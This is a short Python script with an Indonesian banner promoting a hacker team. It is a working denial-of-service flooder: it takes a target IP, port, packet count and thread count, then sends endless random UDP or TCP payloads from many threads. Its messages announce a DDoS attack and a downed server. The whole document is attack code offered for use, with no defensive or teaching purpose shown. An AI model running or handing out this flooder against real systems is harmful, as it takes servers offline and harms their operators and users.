import random
import socket
import threading

print       (" - - > Lord Leo Ni Dek!! < - - ")
print       (" - - > Tolls By Lord!!!! < - - ")
print       (" - - > Join ORBIS TEAM <- - ")                                   
print       (" - - > Rename Pm Gw !! < - - ")
print       (" - - > Xyber Community  < - - ")
print       (" - - > Tuh link nya Join!! < - - ")
print       (" - - >  Are You Ready?  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" Lakukan Penyerangan? (y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sedang Melakukam DDOS Attack!!! ")
		except:
			print("[!] Server Telah Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sedang Melakuakan DDOS Attack!!! ")
		except:
			s.close()
			print("[*] Server Telah Down!!!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()